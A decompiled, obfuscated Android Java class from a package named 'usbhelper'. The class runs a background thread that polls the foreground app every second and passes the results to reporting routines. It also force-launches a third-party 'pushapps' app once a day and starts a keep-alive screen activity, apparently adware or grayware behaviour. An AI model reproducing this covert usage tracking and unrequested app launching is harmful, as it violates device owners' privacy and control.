package com.service.usbhelper.service;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build.VERSION;
import android.text.TextUtils;
import com.service.usbhelper.MyApplication;
import com.service.usbhelper.ScreenLiveActivity;
import com.service.usbhelper.data.C0192a;
import com.service.usbhelper.p010b.C0174a;
import com.service.usbhelper.p015e.C0217f;
import com.service.usbhelper.p015e.Logooo;
import com.service.usbhelper.p015e.SharedPreferencesManager;
import com.service.usbhelper.p015e.C0229r;
import com.service.usbhelper.p015e.C0231t;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.SortedMap;
import java.util.TreeMap;

/* renamed from: com.service.usbhelper.service.m */
public class C0252m extends Thread {
    public static String f341c;
    public static boolean f342d;
    public static int f343e;
    public static int f344f;
    public static C0252m f345g;
    public static boolean f346h;
    public static boolean f347i;
    public static int f348j;
    public static int f349k;
    public static int f350l;
    private static C0244j f351m;
    private static List<String> f352n;
    Context f353a;
    C0240l f354b;

    static {
        f341c = "";
        f342d = false;
        f343e = 1;
        f344f = 1;
        f352n = null;
        f346h = false;
        f347i = true;
        f348j = 0;
        f349k = 0;
        f350l = 0;
    }

    public C0252m(Context context, C0240l c0240l, C0244j c0244j) {
        this.f353a = context;
        this.f354b = c0240l;
        f351m = c0244j;
    }

    public static synchronized C0252m m584a(Context context, C0240l c0240l, C0244j c0244j) {
        C0252m c0252m;
        synchronized (C0252m.class) {
            if (f345g == null) {
                f345g = new C0252m(context, c0240l, c0244j);
            }
            c0252m = f345g;
        }
        return c0252m;
    }

    private static String m585a(ActivityManager activityManager) {
        List runningTasks = activityManager.getRunningTasks(1);
        if (runningTasks != null && runningTasks.size() > 0) {
            RunningTaskInfo runningTaskInfo = (RunningTaskInfo) runningTasks.get(0);
            if (runningTaskInfo != null) {
                ComponentName componentName = runningTaskInfo.topActivity;
                if (componentName != null) {
                    return componentName.getPackageName();
                }
            }
        }
        return null;
    }

    private static String m586a(ActivityManager activityManager, Context context) {
        List arrayList = new ArrayList();
        for (RunningAppProcessInfo runningAppProcessInfo : activityManager.getRunningAppProcesses()) {
            if (runningAppProcessInfo.importance == 100) {
                arrayList.addAll(Arrays.asList(runningAppProcessInfo.pkgList));
            }
        }
        if (f352n == null || f346h) {
            f352n = C0217f.m485c(context, f351m);
            f346h = false;
        }
        if (f352n != null && arrayList.retainAll(f352n) && arrayList.size() > 0) {
            return (String) arrayList.get(0);
        }
        if (VERSION.SDK_INT >= 21) {
            UsageStatsManager usageStatsManager = (UsageStatsManager) context.getSystemService("usagestats");
            long currentTimeMillis = System.currentTimeMillis();
            List<UsageStats> queryUsageStats = usageStatsManager.queryUsageStats(0, currentTimeMillis - 3600000, currentTimeMillis);
            if (queryUsageStats != null) {
                SortedMap treeMap = new TreeMap();
                for (UsageStats usageStats : queryUsageStats) {
                    treeMap.put(Long.valueOf(usageStats.getLastTimeUsed()), usageStats);
                }
                if (!treeMap.isEmpty()) {
                    String packageName = ((UsageStats) treeMap.get(treeMap.lastKey())).getPackageName();
                    if (TextUtils.isEmpty(packageName)) {
                        packageName = "running_package_null";
                    }
                    Logooo.e7("UsageStatsManager get package name is " + packageName);
                    return packageName;
                }
            }
        }
        return "running_package_null";
    }

    public static String m587a(Context context) {
        if (context == null) {
            return null;
        }
        ActivityManager activityManager = (ActivityManager) context.getSystemService("activity");
        return VERSION.SDK_INT > 20 ? C0252m.m586a(activityManager, context) : C0252m.m585a(activityManager);
    }

    public static void m588a() {
        SharedPreferences a = SharedPreferencesManager.getSharedPreferences(MyApplication.getCt());
        if ((System.currentTimeMillis() / 1000) - a.getLong("last_pull_up_stamp", 0) < 86400) {
            Logooo.e5("all ready pull up today");
            return;
        }
        try {
            Intent intent = new Intent();
            intent.setClassName("com.pushapps", "com.pushapps.MainActivity");
            intent.addFlags(268435456);
            MyApplication.getCt().startActivity(intent);
            if (VERSION.SDK_INT > 8) {
                a.edit().putLong("last_pull_up_stamp", System.currentTimeMillis() / 1000).apply();
            } else {
                a.edit().putLong("last_pull_up_stamp", System.currentTimeMillis() / 1000).commit();
            }
            Logooo.e1("pull up pushapps....");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void m589a(int i) {
        while (f342d) {
            String a = C0252m.m587a(this.f353a);
            if (TextUtils.isEmpty(a)) {
                a = "running_package_null";
            }
            if (!TextUtils.isEmpty(f341c) && f341c.equals(a)) {
                this.f354b.m562a(f341c, i);
            } else if (!(TextUtils.isEmpty(f341c) || f341c.equals(a))) {
                this.f354b.m563a(f341c, a, i);
                f341c = a;
            }
            if (C0252m.m592c(f349k / C0174a.f133d)) {
                f349k = 0;
            }
            Logooo.e3("count:" + f343e);
            if (f343e >= 300) {
                C0192a.m398a(C0192a.m404c(), this.f353a, i);
                f348j++;
                if (HelperService.f305c != null && HelperService.f305c.size() > 0 && f348j >= C0174a.f133d) {
                    C0192a.m397a(C0192a.m406d(), 1);
                    f348j = 0;
                }
                C0192a.m395a(2, this.f353a);
                f343e = 1;
            }
            try {
                f343e++;
                f349k++;
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private void m590b(int i) {
        while (f342d) {
            if (f347i && C0229r.m527b(MyApplication.getCt())) {
                this.f354b.m564a(C0217f.f266a);
                if (f350l >= C0174a.f131b / C0174a.f133d) {
                    C0229r.m523a(this.f354b, i, f351m);
                    f350l = 0;
                }
            }
            if (C0252m.m592c(f349k)) {
                f349k = 0;
            }
            Logooo.e3("count:" + f343e);
            if (f343e >= 300) {
                C0192a.m397a(C0192a.m406d(), 1);
                C0192a.m395a(2, this.f353a);
                f343e = 1;
            }
            if (f344f * C0174a.f133d >= 300) {
                C0192a.m401b();
                f344f = 1;
            }
            try {
                f343e++;
                f344f++;
                f349k++;
                f350l++;
                Thread.sleep((long) (C0174a.f133d * 1000));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public static void m591b(Context context) {
        if (context != null) {
            if ((System.currentTimeMillis() / 1000) - SharedPreferencesManager.getSharedPreferences(context).getLong("last_send_other_stamp", 0) < 10800) {
                Logooo.e5("\u4eca\u5929\u5df2\u7ecf\u53d1\u9001\u8fc7\uff0c\u4e0d\u5728\u53d1\u9001\u3002\u3002\u3002");
                return;
            }
            Intent intent = new Intent(context.getApplicationContext(), ScreenLiveActivity.class);
            intent.addFlags(268435456);
            context.startActivity(intent);
            new Thread(new C0253n(context)).start();
        }
    }

    private static boolean m592c(int i) {
        if (HelperService.f305c == null || HelperService.f305c.size() <= 0) {
            if (HelperService.f308f == null || HelperService.f308f.size() == 0) {
                HelperService.f308f = C0217f.m483b(MyApplication.getCt(), C0217f.f266a, null);
            }
            HelperService.f305c = C0229r.m522a(HelperService.f308f);
            return true;
        } else if (i < C0174a.f132c) {
            return false;
        } else {
            synchronized (HelperService.f306d) {
                for (C0231t stopWatching : HelperService.f305c) {
                    stopWatching.stopWatching();
                }
                HelperService.f305c.clear();
                HelperService.f308f = C0217f.m483b(MyApplication.getCt(), C0217f.f266a, null);
                HelperService.f305c = C0229r.m522a(HelperService.f308f);
            }
            return true;
        }
    }

    public void run() {
        super.run();
        f342d = true;
        f341c = C0252m.m587a(this.f353a);
        if (TextUtils.isEmpty(f341c) || "running_package_null".equals(f341c)) {
            m590b(1);
        } else {
            m589a(0);
        }
    }
}
